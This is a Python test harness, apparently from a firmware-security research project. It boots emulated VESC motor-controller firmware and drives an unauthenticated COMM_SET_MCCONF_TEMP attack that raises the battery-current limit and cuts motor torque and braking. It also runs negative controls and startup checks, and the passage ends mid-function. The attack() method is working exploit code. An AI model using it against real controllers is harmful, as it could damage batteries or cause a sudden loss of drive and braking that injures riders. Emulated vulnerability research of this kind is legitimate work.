# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The vesc-bldc-f405 attack, driven against the firmware's OWN COMM engine.

**The vulnerability.** VESC's binary COMM protocol has no authentication, no
session and no sequence number. Every command is accepted from anyone who can
put bytes on the controller's UART header (or its CAN bus, or its USB port).
``COMM_SET_MCCONF`` is one of those commands, and it rewrites the *motor
configuration* -- including ``l_current_max``, the motor-current limit that is
the ESC's and the motor's primary protection against overcurrent. The firmware's
only check is a four-byte ``MCCONF_SIGNATURE`` constant compiled into the image
(``confgenerator.h:11``), which is a **version tag, not a credential**: it is the
same for every VESC of that firmware version, and the device hands it out itself
in every ``COMM_GET_MCCONF`` reply.

**The attack.** Read the live configuration with ``COMM_GET_MCCONF``, change two
of the motor's protection limits in the firmware's own values, write them back
with ``COMM_SET_MCCONF_TEMP``, and read them out again:

* ``l_in_current_max`` 250.0 A -> **300.0 A** -- the battery-current ceiling, i.e.
  how hard the controller is allowed to pull on the pack. Raising it is how you
  push a battery past its safe discharge rate.
* ``l_current_max_scale`` 1.00 -> **0.10** -- the motor-current scaling, i.e. a
  90 % cut in available torque and regenerative braking. On a moving vehicle
  that is a sudden, remote loss of drive and brake.

``COMM_SET_MCCONF_TEMP`` writes straight into
``mc_interface_get_configuration()``; with its ``store`` flag clear it does not
touch the emulated EEPROM, so the change is live immediately (see
``STATUS.md`` for why the EEPROM-writing ``COMM_SET_MCCONF`` is impractically
slow under emulation). Every field the attacker does not intend to change is
copied out of the device's own reply, so the packet is a real read-modify-write.

**The oracle is the firmware's own reply.** ``landed`` is set only when a
*second, independent* ``COMM_GET_MCCONF`` -- a fresh request, answered by
``commands_send_mcconf()`` out of ``mc_interface_get_configuration()``, framed
and CRC'd by the firmware's own ``packet.c`` -- reports the attacker's value.
Nothing on this side is consulted.

**Negative controls run in the same harness, on the same connection** (playbook
§2.22 -- an attack that only shows "the write worked" proves very little):

  1. *Bad CRC.* **The attack frame itself**, byte for byte, with one byte of the
     CRC flipped. ``try_decode_packet()`` must drop it: no reply, and the
     configuration must be untouched. Same harness, same payload, same code path
     on this side -- the only difference is the checksum, so if this "worked" the
     oracle would be measuring the harness rather than the firmware.
  2. *Values the firmware must refuse.* The same command asking for
     ``l_in_current_max = 5000 A`` and ``l_current_max_scale = 9.0``. The handler
     runs ``utils_truncate_number()`` against this board's own
     ``HW_LIM_CURRENT_IN`` (-300, 300) and against the fixed 0.0-1.0 scale range,
     so the firmware must clamp them to 300.0 and 1.0. A device that merely
     stored what it was handed would report 5000 and 9.0 back.

If either control "succeeds", the oracle is measuring this harness rather than
the firmware, and ``landed`` is forced false with the reason recorded.
"""
from __future__ import annotations

import json
import os
import re
import socket
import subprocess
import sys
import time
from typing import Callable, Dict, List, Optional

from . import paths, spawn
from . import vesc_comm as vc


_LOG_POS: dict = {}
_LOG_BUF: dict = {}


def _read_log_incremental(path: str) -> str:
    """The spawn log so far, read INCREMENTALLY from a saved offset.

    This replaces ``open(path).read()``, which re-read the WHOLE file on every
    pass of a ~1 Hz readiness poll. That is harmless for this device's own few
    kB of log and catastrophic when anything else is writing to the same path:
    an abandoned emulator holding a multi-GB log open makes each pass cost
    seconds. The client then connects late, a frame the guest transmitted
    before the connect is missed, and the run grades the device BELOW its real
    rung -- an instrument artefact, not a property of the firmware.

    Reading from a saved offset makes the poll cost independent of the file's
    size and of any other writer. If the file shrank (a new run truncated it)
    the offset is reset so the fresh contents are not skipped.
    """
    try:
        size = os.path.getsize(path)
        if size < _LOG_POS.get(path, 0):
            _LOG_POS[path] = 0
            _LOG_BUF[path] = ""
        with open(path, "rb") as fh:
            fh.seek(_LOG_POS.get(path, 0))
            chunk = fh.read()
        if chunk:
            _LOG_POS[path] = _LOG_POS.get(path, 0) + len(chunk)
            _LOG_BUF[path] = _LOG_BUF.get(path, "") + chunk.decode("utf-8", "replace")
    except OSError:
        pass
    return _LOG_BUF.get(path, "")


# What the attacker installs. Both are chosen so the read-back tests the WRITE
# and not a clamp: hw_100_250.h:256 declares HW_LIM_CURRENT_IN -300.0, 300.0, so
# 300.0 A is the top of this hardware's own range and passes
# `utils_truncate_number()` unchanged; and the handler truncates the current
# scales to 0.0-1.0, so 0.10 passes too. Both are exactly representable in the
# encodings VESC uses (binary32, and int16/10000).
ATTACK_IN_CURRENT_MAX = 300.0
ATTACK_CURRENT_MAX_SCALE = 0.10

# A terminal command the firmware answers with a string only IT can produce.
# Sending one is also load-bearing, not decoration: `commands_printf()` writes
# through `send_func_blocking`, and NOTHING sets that except the blocking
# command group -- of which COMM_TERMINAL_CMD is a member (commands.c:1687-1715).
# Until a terminal command has been sent, every warning the firmware prints,
# including the one the negative control is looking for, is composed and then
# dropped on the floor with no error. That is a property of the firmware, not of
# this rehost.
TERMINAL_PROBE = b"fault"

BOOT_MARKER = "USART3: enabled by the firmware"
#: Falsification knob for the census seam.  With ``HAL_SEAM_CONTROL=1`` no VESC
#: packet is ever put on the wire, so the firmware's own packet.c never answers
#: and ``vesc_packet_round_trip`` -- and therefore ``landed`` -- must come out
#: false.  A seam boolean that no control can move is not evidence.  It is armed
#: only after the boot oracle has been satisfied, so the control falsifies the
#: evidence seam rather than the boot check in front of it.
SEAM_CONTROL = os.environ.get("HAL_SEAM_CONTROL") == "1"
_SEAM_ARMED = False

BOOT_TIMEOUT = float(os.environ.get("VESC_BOOT_TIMEOUT", "900"))
REPLY_TIMEOUT = float(os.environ.get("VESC_REPLY_TIMEOUT", "180"))
# How long to wait when the firmware's source says NOTHING should come back.
SILENCE_TIMEOUT = float(os.environ.get("VESC_SILENCE_TIMEOUT", "25"))


# ---------------------------------------------------------------------------
# THE TWO STARTUP GATES.  Read this before trusting any milestone below.
#
# `run_attack` used to pre-initialise its result with `"milestone": "M1"` and
# then do `if not sc.boot(stage): return result`.  Every failure inside
# `boot()` -- "HALucinator exited during boot (rc=..., see <path>)", "the
# firmware never enabled USART3", "could not connect to the bridge" -- therefore
# reported **M1**, so a HOST-side startup failure (wrong interpreter, missing
# halucinator, an import error, an arch the core does not have) was recorded
# indistinguishably from a firmware that genuinely walls at M1.  On THIS device
# that mattered: two core-validation agents ran it concurrently on 2026-09-01,
# and a harness that cannot tell a dead install from a dead device can hand a
# core gate a false "safe to ship".
#
# The pre-init is now "M0" and those paths report `"milestone": "ERROR"` with
# the child's own exception IN THE RESULT, instead of a path to a file nobody
# reads.
#
# GATE 1 -- the core's own positive CPU-start marker.
# `halucinator.main` logs "Letting Unicorn Run" immediately before it enters the
# dispatch loop.  Absent => the CPU never started => nothing above M0 is
# measurable.
#
#   *** THE MARKER IS NOT FREE. ***  `python -m halucinator.main` runs main.py
#   as `__main__`, so the marker goes to the logger "__main__" -- not to the
#   "halucinator.main" this device's `configs/logging.cfg` named.  On the cores
#   whose CWD branch loads that file with `disable_existing_loggers=True`,
#   "__main__" is disabled outright, and raising root's level does NOT help
#   because a disabled logger emits nothing at any level.  Measured on this
#   device on 2026-09-02, BEFORE the fix: a boot that reached the firmware's own
#   USART3 driver contained ZERO occurrences of the marker.  `logging.cfg` now
#   carries a `[logger_mainmod]` stanza (propagate=0 + its own handler, so it
#   works on both branches) and the marker prints.
#
#   `logging_cfg_present()` therefore tests PRINTABILITY -- the file exists AND
#   names `__main__` -- not mere existence.  When it is False, Gate 1 reports
#   `None`, never False: an absent marker must never be read as a startup
#   failure when the real cause is that it could not have been printed.  That
#   distinction is what stops this gate from false-demoting a healthy run.
#
# GATE 2 -- a measured-work floor (credit: a peer session's autofuzz
# `g_blocks_per_exec` gate, which caught a generated harness writing
# `passed:true` with `blocks_per_exec: 0`).  Gate 1 proves the core reached the
# point of starting the CPU; Gate 2 proves the CPU then did real work.  A fault
# immediately after the print passes Gate 1 and fails Gate 2.
#
#   THE METRIC IS THE EMULATOR CHILD'S OWN **CPU TIME**, not a firmware counter.
#   A firmware-derived counter would convert a genuine early firmware wall into
#   a fabricated "install broken" verdict, which is exactly the classifier
#   failure a work floor must not commit.  CPU seconds are model- and
#   firmware-independent and -- unlike wall clock -- do not tighten when the box
#   is loaded, which on this machine varies by more than 1.7x between runs of
#   the same device.
#
# THE FLOOR IS DERIVED FROM THIS DEVICE'S OWN HEALTHY BOOT, never a fleet
# constant.  See WORK_HEALTHY_CPU_S for the measurement.
RUN_MARKER = "Letting Unicorn Run"
#: CPU seconds the emulator child had burned AT THE GATE -- the moment the
#: firmware's own USART3 driver enabled the port (BOOT_MARKER) -- on this
#: device's own healthy boot.  Measured twice on 2026-09-02:
#:
#:     run A: 25.77 CPU s, 26.1 s wall, box load 22.7
#:     run B: 25.34 CPU s, 26.1 s wall, box load 17.9
#:
#: 1.7 % apart across a 27 % swing in box load, which is the whole reason the
#: metric is CPU time and not wall clock: it measures work, so it does not
#: tighten when the machine is busy.
WORK_HEALTHY_CPU_S = float(os.environ.get("VESC_HEALTHY_CPU_S", "25.3"))
#: Gate 2's floor: 2.0 CPU seconds, about 1/13 of the measured healthy reading.
#: Deliberately far below it.  A floor tuned close to the healthy figure files a
#: slow-but-live boot as a dead device -- this fleet has already misfiled walls
#: that way (bgan-inmarsat at a 420 s bound; zigbee-znp needed 25 s -> 55 s) --
#: and a floor is a classifier, so the only safe direction to be wrong in is
#: down.  The failure it must catch reads **0.00**: a child that dies before it
#: can import halucinator has burned no CPU at all.  A live guest, however
#: slowly it is progressing, burns CPU continuously and clears 2.0 s within
#: seconds of starting.
WORK_FLOOR_CPU_S = float(os.environ.get("VESC_WORK_FLOOR_CPU_S", "2.0"))
#: Evidence that the GUEST ran and then faulted.  These strings can only be
#: produced by the core's own guest-fault path, which requires the core to be
#: executing guest instructions -- so their presence is proof the install works
#: and the failure belongs to the firmware.  Gate 2 must NOT fire when they are
#: present: a firmware that faults after 1.5 CPU seconds would otherwise be
#: filed as a broken install, which is precisely the classifier failure a work
#: floor must not commit.  A bare Python ``Traceback`` is deliberately NOT in
#: this list -- that is an install symptom, not a guest fault.
_GUEST_FAULT_MARKERS = ("UC_ERR", "FETCH-DERAIL", "unicorn.unicorn.UcError",
                        "UcError")


def _child_cpu_seconds(proc) -> float:
    """CPU seconds burned by the emulator child and its own children.

    Sampled while the child is still alive; returns 0.0 once it is gone or if
    it was never started, which is exactly the reading a failed startup gives.

    Raises RuntimeError if psutil is missing -- see below.
    """
    if proc is None:
        return 0.0
    # An ABSENT psutil is not a measurement of zero. Swallowing the ImportError
    # here returned 0.0, which is byte-identical to "the emulator did no work"
    # -- so running in a venv without psutil failed gate 2 on a HEALTHY boot and
    # blamed the device. Distinguish the two: a gate that cannot measure must
    # say so, not report the failing value.
    try:
        import psutil
    except ImportError as exc:                             # noqa: BLE001
        raise RuntimeError(
            "gate 2 cannot measure child CPU time: psutil is not installed in "
            f"this interpreter ({sys.executable}). This is a HARNESS fault, not "
            "a device result -- rerun in a venv that has psutil rather than "
            "reading the 0.0 this used to return."
        ) from exc
    try:
        p = psutil.Process(proc.pid)
        t = p.cpu_times()
        total = float(t.user) + float(t.system)
        for c in p.children(recursive=True):
            try:
                ct = c.cpu_times()
                total += float(ct.user) + float(ct.system)
            except Exception:                              # noqa: BLE001
                pass
        return total
    except Exception:                                      # noqa: BLE001
        return 0.0


def _last_exception(text: str) -> str:
    """``ExceptionClass: message`` of the last traceback in the child's log.

    The fleet-wide shape is `note="HALucinator exited during boot (see %s)"`:
    the reason lives in a file and the operator is handed a path.  The reason
    belongs in the RESULT, so it cannot be mistaken for a device fact.
    """
    blocks = re.split(r"(?=Traceback \(most recent call last\))", text)
    for block in reversed(blocks):
        if not block.startswith("Traceback"):
            continue
        lines = [ln for ln in block.splitlines() if ln.strip()]
        for ln in reversed(lines):
            if ln.startswith(" "):
                continue
            if re.match(r"^[A-Za-z_][\w.]*(?:Error|Exception|Exit|Interrupt"
                        r"|Warning|Failure|Fault)?: ?", ln.strip()):
                return ln.strip()
        if lines:
            return lines[-1].strip()
    return ""


class VescScenario:
    """Boots the rehosted VESC and speaks its COMM protocol over the USART3
    bridge. The firmware is the real rehost; nothing here is simulated."""

    def __init__(self, bridge_port: int = spawn.BRIDGE_PORT,
                 python: Optional[str] = None,
                 log_dir: Optional[str] = None) -> None:
        self.bridge_port = bridge_port
        self.python = python or sys.executable
        self.log_dir = log_dir or "/tmp"
        self.host = "127.0.0.1"
        self._procs: List[subprocess.Popen] = []
        self._sock: Optional[socket.socket] = None
        self._rx = bytearray()
        self.log = os.path.join(self.log_dir, ("vesc_bldc_f405_attack.%d.log" % os.getpid()))
        #: Set by :meth:`boot` on every failure path. Carries the gate readings
        #: and the CHILD'S OWN exception, so the caller can put the reason in
        #: the RESULT instead of handing the operator a path to a file.
        self.startup_failure: Optional[Dict] = None

    # ---- the startup gates -------------------------------------------------
    def _emu(self):
        return self._procs[0] if self._procs else None

    def cpu_seconds(self) -> float:
        """Gate 2's metric: CPU seconds burned by the emulator child."""
        return _child_cpu_seconds(self._emu())

    def returncode(self):
        """The child's rc if it died on its own, else ``None``."""
        p = self._emu()
        return None if p is None else p.poll()

    def log_text(self) -> str:
        try:
            return open(self.log, errors="replace").read()
        except OSError:
            return ""

    @staticmethod
    def logging_cfg_present() -> bool:
        """Whether Gate 1's marker CAN be printed at all.

        Existence is NOT the test.  `setLogConfig()` reads `logging.cfg` from
        the CHILD'S CWD (the packaged configs dir), and the marker is written to
        the logger `__main__`; a `logging.cfg` that does not NAME `__main__`
        leaves it inheriting root's ERROR -- or disabled outright on the cores
        whose CWD branch passes `disable_existing_loggers=True`.  This device
        shipped exactly such a file, and a boot that reached the firmware's own
        USART3 driver printed the marker zero times.  So: present AND naming
        `__main__`.
        """
        try:
            cfg = paths.configs_dir() / "logging.cfg"
            return cfg.is_file() and "__main__" in cfg.read_text(errors="replace")
        except Exception:                                  # noqa: BLE001
            return False

    def startup_error(self, cpu_s: Optional[float] = None) -> Optional[Dict]:
        """``None`` if BOTH gates pass, else the diagnosis for the RESULT."""
        text = self.log_text()
        rc = self.returncode()
        cpu = self.cpu_seconds() if cpu_s is None else cpu_s
        tail = [ln for ln in text.splitlines() if ln.strip()]
        gate1 = (RUN_MARKER in text) if self.logging_cfg_present() else None
        common = {
            "gate1_cpu_started": gate1,
            "gate2_child_cpu_s": round(cpu, 2),
            "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
            "child_returncode": rc,
            "child_output_tail": tail[-20:],
            "logging_cfg_present": self.logging_cfg_present(),
            "error_detail": _last_exception(text) or (
                tail[-1] if tail else "(child produced no output at all)"),
        }
        if gate1 is False:
            return dict(common, error=(
                "GATE 1: the emulator never started -- the core's '%s' marker "
                "is absent, so no guest instruction ran (child rc=%s)"
                % (RUN_MARKER, rc)))
        guest_faulted = any(m in text for m in _GUEST_FAULT_MARKERS)
        if cpu < WORK_FLOOR_CPU_S and not guest_faulted:
            return dict(common, error=(
                "GATE 2: the emulator child did no measured work -- %.2f CPU "
                "seconds < this device's floor of %.2f (a healthy boot has "
                "burned %.1f by the time USART3 comes up)"
                % (cpu, WORK_FLOOR_CPU_S, WORK_HEALTHY_CPU_S)))
        return None

    def startup_failure_or_device(self, why: str) -> Dict:
        """Attribute a boot failure to the INSTALL or to the DEVICE.

        ``gated_out`` is True when a gate failed (nothing is measurable, so the
        milestone is ERROR) and False when the gates passed -- which means the
        CPU really did run, and ``why`` is a fact about this firmware rather
        than about the environment.
        """
        bad = self.startup_error()
        if bad:
            bad["error"] = "%s -- %s" % (bad["error"], why)
            bad["gated_out"] = True
            return bad
        text = self.log_text()
        tail = [ln for ln in text.splitlines() if ln.strip()]
        cpu = self.cpu_seconds()
        return {
            "error": "%s -- and the gates PASSED (marker=%s, %.2f CPU seconds "
                     "burned by the child), so this is the device, not the "
                     "install" % (why, (RUN_MARKER in text)
                                  if self.logging_cfg_present() else "n/a", cpu),
            "error_detail": _last_exception(text) or (tail[-1] if tail else ""),
            "gate1_cpu_started": (RUN_MARKER in text)
            if self.logging_cfg_present() else None,
            "gate2_child_cpu_s": round(cpu, 2),
            "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
            "logging_cfg_present": self.logging_cfg_present(),
            "child_returncode": self.returncode(),
            "child_output_tail": tail[-20:],
            "guest_faulted": any(m in text for m in _GUEST_FAULT_MARKERS),
            "gated_out": False,
        }

    # ---- process management ------------------------------------------------
    def _spawn(self, argv, cwd, env, logpath) -> subprocess.Popen:
        p = subprocess.Popen(argv, cwd=cwd, env=env, stdout=open(logpath, "w"),
                             stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        self._procs.append(p)
        return p

    def _log_has(self, needle: str) -> bool:
        try:
            return needle in _read_log_incremental(self.log)
        except OSError:
            return False

    def shutdown(self) -> None:
        # Kill ONLY the PIDs we started. Never a global pattern kill: several
        # emulators run on this machine at once (playbook §2.10).
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        for p in self._procs:
            try:
                os.killpg(p.pid, 15)
            except Exception:  # noqa: BLE001
                pass
            try:
                p.wait(10)
            except Exception:  # noqa: BLE001
                try:
                    p.kill()
                except Exception:  # noqa: BLE001
                    pass
        self._procs = []

    def boot(self, on_stage: Callable) -> bool:
        self.startup_failure = None
        if not paths.firmware_present():
            self.startup_failure = {
                "error": "firmware not found at %s -- build it (FIRMWARE.md) "
                         "and run tools/extract_firmware.py"
                         % paths.firmware_bin(),
                "error_detail": "no emulator was started; no milestone measured",
                "gate1_cpu_started": None, "gate2_child_cpu_s": 0.0,
                "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
                "logging_cfg_present": self.logging_cfg_present(),
                "child_returncode": None, "child_output_tail": [],
                "gated_out": True,
            }
            on_stage("error", note=self.startup_failure["error"])
            return False
        argv = spawn.spawn_argv(python=self.python, emulator="unicorn")
        env = spawn.spawn_env(uart_port=self.bridge_port)
        on_stage("boot", note="booting the VESC firmware under HALucinator "
                              "(ChibiOS on an STM32F405; reaching the COMM "
                              "stack takes a couple of minutes of wall clock)")
        p = self._spawn(argv, spawn.spawn_cwd(), env, self.log)

        # Readiness is the FIRMWARE's own driver reaching the port: the USART3
        # model logs the moment app_uartcomm_start() writes CR1.UE. Poll the log
        # rather than sleeping (macOS has no timeout(1); playbook §1).
        deadline = time.time() + BOOT_TIMEOUT
        while time.time() < deadline:
            if p.poll() is not None:
                # NOT `note="... (see %s)" % self.log`.  A reason that lives in
                # a file is a reason nobody reads, and it is then indexed as a
                # device fact.  The child's own exception goes in the RESULT.
                self.startup_failure = self.startup_failure_or_device(
                    "the emulator process exited during boot (rc=%s)" % p.poll())
                on_stage("error", note=self.startup_failure["error"])
                return False
            if self._log_has(BOOT_MARKER):
                break
            time.sleep(2)
        else:
            self.startup_failure = self.startup_failure_or_device(
                "the firmware never enabled USART3 within %.0f s" % BOOT_TIMEOUT)
            on_stage("error", note=self.startup_failure["error"])
            return False

        try:
            self._sock = socket.create_connection(
                (self.host, self.bridge_port), timeout=10)
            self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError as exc:
            self.startup_failure = self.startup_failure_or_device(
                "could not connect to the USART3 bridge on tcp/%d: %s"
                % (self.bridge_port, exc))
            on_stage("error", note=self.startup_failure["error"])
            return False
        on_stage("ready", note="USART3 is up; connected to the COMM seam on "
                               "tcp/%d" % self.bridge_port)
        return True

    # ---- protocol ----------------------------------------------------------
    def _send(self, raw: bytes) -> None:
        assert self._sock is not None
        if SEAM_CONTROL and _SEAM_ARMED:
            return
        self._sock.sendall(raw)

    def _read_frame(self, timeout: float = REPLY_TIMEOUT,
                    want: Optional[int] = None) -> Optional[bytes]:
        """Read until a complete, CRC-valid frame arrives (optionally with a
        given packet id). Returns the payload, or None on timeout.

        Frames are consumed from a persistent buffer, so an unsolicited
        ``COMM_PRINT`` cannot desynchronise the next read.
        """
        assert self._sock is not None
        deadline = time.time() + timeout
        while True:
            while True:
                payload, used = vc.unframe(bytes(self._rx))
                if payload is None:
                    break
                del self._rx[:used]
                if want is None or (payload and payload[0] == want):
                    return payload
            remaining = deadline - time.time()
            if remaining <= 0:
                return None
            self._sock.settimeout(min(remaining, 10.0))
            try:
                chunk = self._sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                return None
            if not chunk:
                return None
            self._rx += chunk

    def request(self, payload: bytes, want: Optional[int] = None,
                timeout: float = REPLY_TIMEOUT) -> Optional[bytes]:
        self._send(vc.frame(payload))
        return self._read_frame(timeout=timeout, want=want)

    def fw_version(self) -> Optional[bytes]:
        return self.request(bytes([vc.COMM_FW_VERSION]),
                            want=vc.COMM_FW_VERSION)

    def get_mcconf(self) -> Optional[bytes]:
        """The firmware's own serialized mc_configuration (without the id byte)."""
        payload = self.request(bytes([vc.COMM_GET_MCCONF]),
                               want=vc.COMM_GET_MCCONF)
        return None if payload is None else payload[1:]

    # ---- read / attack seams ----------------------------------------------
    def read_state(self) -> Dict[str, object]:
        """The firmware's real state, read through its real protocol engine."""
        state: Dict[str, object] = {}
        fw = self.fw_version()
        if fw is not None:
            state["fw_version_frame"] = vc.frame(fw).hex()
            try:
                state.update(vc.parse_fw_version(fw))
            except ValueError:
                pass
        conf = self.get_mcconf()
        if conf is not None:
            state.update(self._decode(conf))
        return state

    @staticmethod
    def _decode(conf: bytes) -> Dict[str, object]:
        """The limits this attack targets, out of the firmware's own bytes."""
        return {
            "mcconf_len": len(conf),
            "mcconf_signature": "0x%08x" % int.from_bytes(conf[:4], "big"),
            "l_current_max": round(
                vc.parse_float32_auto(conf, vc.MCCONF_OFF_L_CURRENT_MAX), 3),
            "l_in_current_max": round(
                vc.parse_float32_auto(conf, vc.MCCONF_OFF_L_IN_CURRENT_MAX), 3),
            "l_current_max_scale": round(
                vc.parse_float16(conf, vc.MCCONF_OFF_L_CURRENT_MAX_SCALE), 4),
        }

    def terminal(self, cmd: bytes,
                 timeout: float = REPLY_TIMEOUT) -> Optional[str]:
        """Run a command on the firmware's own debug terminal, unauthenticated.

        Also registers this connection as ``send_func_blocking``, which is what
        makes ``commands_printf()`` reach the wire at all.
        """
        payload = self.request(bytes([vc.COMM_TERMINAL_CMD]) + cmd,
                               want=vc.COMM_PRINT, timeout=timeout)
        if payload is None:
            return None
        return bytes(payload[1:]).split(b"\x00")[0].decode("latin-1", "replace")

    def attack(self) -> dict:
        """Unauthenticated COMM_SET_MCCONF_TEMP: move the motor's safety limits.

        Runs the negative controls in the SAME harness on the SAME connection,
        then the attack, then a fresh independent read-back. ``landed`` requires
        all of it.
        """
        res: dict = {"landed": False}

        # A terminal session: unauthenticated in its own right, and the reply is
        # a string only the firmware can produce.
        res["terminal_cmd"] = TERMINAL_PROBE.decode()
        res["terminal_reply"] = self.terminal(TERMINAL_PROBE)

        base = self.get_mcconf()
        if base is None:
            res["error"] = "the firmware did not answer COMM_GET_MCCONF"
            return res
        res["before"] = self._decode(base)
        res["requested"] = {"l_in_current_max": ATTACK_IN_CURRENT_MAX,
                            "l_current_max_scale": ATTACK_CURRENT_MAX_SCALE}

        payload = vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=ATTACK_IN_CURRENT_MAX,
            l_current_max_scale=ATTACK_CURRENT_MAX_SCALE)
        good = vc.frame(payload)
        res["attack_frame"] = good.hex()

        # ---- negative control 1: THE SAME FRAME with a corrupted CRC --------
        # Byte for byte the attack, one byte different, and that byte is only
        # the checksum. try_decode_packet() must drop it: no reply, and no
        # change. If this "worked", the oracle would be measuring this harness
        # rather than the firmware (playbook §2.22).
        bad_crc = bytearray(good)
        bad_crc[-3] ^= 0xFF
        self._send(bytes(bad_crc))
        res["neg_bad_crc_reply"] = self._read_frame(
            timeout=SILENCE_TIMEOUT) is not None
        after_crc = self.get_mcconf()
        res["neg_bad_crc_state"] = None if after_crc is None \
            else self._decode(after_crc)
        res["neg_bad_crc_rejected"] = bool(
            not res["neg_bad_crc_reply"]
            and after_crc is not None
            and self._decode(after_crc) == res["before"])

        # ---- negative control 2: values the firmware MUST refuse ----------
        # The same command, the same code path, but asking for
        # l_in_current_max = 5000 A and l_current_max_scale = 9.0. The handler
        # runs `utils_truncate_number()` against this hardware's own
        # HW_LIM_CURRENT_IN (-300, 300) and against the fixed 0.0-1.0 range for
        # the scales, so a device that DISCRIMINATES clamps them to 300.0 and
        # 1.0; a device (or a harness) that merely stores what it is handed
        # would report 5000 and 9.0 back. This is the control that proves the
        # positive result is the firmware accepting a value rather than an echo
        # (playbook §2.22).
        absurd = vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=5000.0, l_current_max_scale=9.0)
        self._send(vc.frame(absurd))
        clamp_ack = self._read_frame(timeout=REPLY_TIMEOUT)
        res["neg_clamp_ack_id"] = None if clamp_ack is None else clamp_ack[0]
        after_clamp = self.get_mcconf()
        res["neg_clamp_state"] = None if after_clamp is None \
            else self._decode(after_clamp)
        res["neg_clamp_enforced"] = bool(
            after_clamp is not None
            and abs(self._decode(after_clamp)["l_in_current_max"] - 300.0) < 1e-3
            and abs(self._decode(after_clamp)["l_current_max_scale"] - 1.0) < 1e-4)

        # Put the limits back where the device had them, so the attack below
        # starts from the device's own configuration and its effect is
        # unambiguous.
        self._send(vc.frame(vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=res["before"]["l_in_current_max"],
            l_current_max_scale=res["before"]["l_current_max_scale"])))
        self._read_frame(timeout=REPLY_TIMEOUT)
        restored = self.get_mcconf()
        res["restored_state"] = None if restored is None \
            else self._decode(restored)

        # ---- the attack ------------------------------------------------------
        self._send(good)
        ack = self._read_frame(timeout=REPLY_TIMEOUT)
        res["set_ack_id"] = None if ack is None else ack[0]
        res["set_ack_frame"] = "" if ack is None else vc.frame(ack).hex()

        # ---- an INDEPENDENT read-back: the oracle ---------------------------
        after = self.get_mcconf()
        if after is None:
            res["error"] = "no COMM_GET_MCCONF reply after the write"
            return res
        res["after"] = self._decode(after)
        res["readback_in_current_max_bytes"] = after[
            vc.MCCONF_OFF_L_IN_CURRENT_MAX:
            vc.MCCONF_OFF_L_IN_CURRENT_MAX + 4].hex()
        res["readback_current_max_scale_bytes"] = after[
            vc.MCCONF_OFF_L_CURRENT_MAX_SCALE:
            vc.MCCONF_OFF_L_CURRENT_MAX_SCALE + 2].hex()

        changed = (
            abs(res["after"]["l_in_current_max"] - ATTACK_IN_CURRENT_MAX) < 1e-3
            and abs(res["after"]["l_current_max_scale"]
                    - ATTACK_CURRENT_MAX_SCALE) < 1e-4
            and res["after"] != res["before"])
        res["changed"] = changed

        res["landed"] = bool(changed
                             and res["neg_bad_crc_rejected"]
                             and res["neg_clamp_enforced"])
        if changed and not res["landed"]:
            res["error"] = ("the write landed but a negative control did NOT "
                            "behave as the firmware's source says it must, so "
                            "the oracle is not trustworthy on this run")
        return res


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None) -> dict:
    """Fleet-standard entry point (playbook §2a). Self-booting.

    Returns at least ``booted`` and ``landed``. ``landed`` comes from the
    firmware's OWN COMM replies, never from host bookkeeping.
    """
    def stage(name, **d):
        if on_stage:
            on_stage(name, **d)

    # HAL_PY first, then sys.executable.  spawn_argv() already honours HAL_PY,
    # but passing sys.executable here overrode it -- which made the one control
    # arm that reproduces a BROKEN INSTALL (an interpreter with no halucinator)
    # unrunnable against this harness.  A gate you cannot make fail is not a
    # gate.
    sc = VescScenario(python=os.environ.get("HAL_PY") or sys.executable,
                      log_dir=log_dir or "/tmp")
    # "M0", NOT "M1".  A pre-initialised rung is a milestone nobody measured,
    # and every early-exit below used to return it verbatim.
    result: dict = {"booted": False, "landed": False, "milestone": "M0",
                    "vesc_packet_round_trip": False,
                    "seam_control": SEAM_CONTROL,
                    "gate1_cpu_started": None,
                    "gate2_child_cpu_s": 0.0,
                    "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
                    "logging_cfg_present": VescScenario.logging_cfg_present()}
    try:
        if not sc.boot(stage):
            bad = dict(sc.startup_failure or {})
            gated = bad.pop("gated_out", True)
            faulted = bad.pop("guest_faulted", False)
            result.update(bad)
            # ERROR when a gate failed: nothing was measured, so there is no
            # milestone to report and the failure is about the install.
            # Otherwise the CPU really did run, so the rung is a fact about
            # this firmware -- M0 if the guest faulted, else M1 (booted without
            # faulting, but never reached its own USART3 driver).  This can only
            # ever DEMOTE: the old code returned M1 unconditionally here.
            result["milestone"] = ("ERROR" if gated
                                   else ("M0" if faulted else "M1"))
            return result
        result["booted"] = True
        # --- THE GATES, before anything is graded ----------------------
        result["gate1_cpu_started"] = (
            RUN_MARKER in sc.log_text() if sc.logging_cfg_present() else None)
        result["gate2_child_cpu_s"] = round(sc.cpu_seconds(), 2)
        bad = sc.startup_error()
        if bad:
            result.update(bad)
            result["milestone"] = "ERROR"
            result["booted"] = False
            result["landed"] = False
            stage("gates", note=result["error"])
            return result
        stage("gates", note="gate1 marker=%s (logging.cfg names __main__: %s), "
                            "gate2 child cpu=%.2fs (floor %.2f, healthy %.1f)"
              % (result["gate1_cpu_started"], result["logging_cfg_present"],
                 result["gate2_child_cpu_s"], WORK_FLOOR_CPU_S,
                 WORK_HEALTHY_CPU_S))
        # M2/M3: the boot oracle is the firmware's own output over its own
        # protocol engine, which needs ChibiOS scheduling its comm threads.
        result["milestone"] = "M3"
        state = sc.read_state()
        stage("read", state=state)
        global _SEAM_ARMED
        _SEAM_ARMED = SEAM_CONTROL
        atk = sc.attack()
        stage("attack", result=atk)
        result["state"] = state
        result["attack"] = atk
        # THE SEAM (M4).  Every clause is a reply the firmware framed and CRC'd
        # with its own packet.c: an independent COMM_GET_MCCONF read-back
        # reporting the attacker's value, the SAME frame with one CRC byte
        # flipped dropped in silence, and absurd values clamped by the
        # firmware's own utils_truncate_number() against this board's limits.
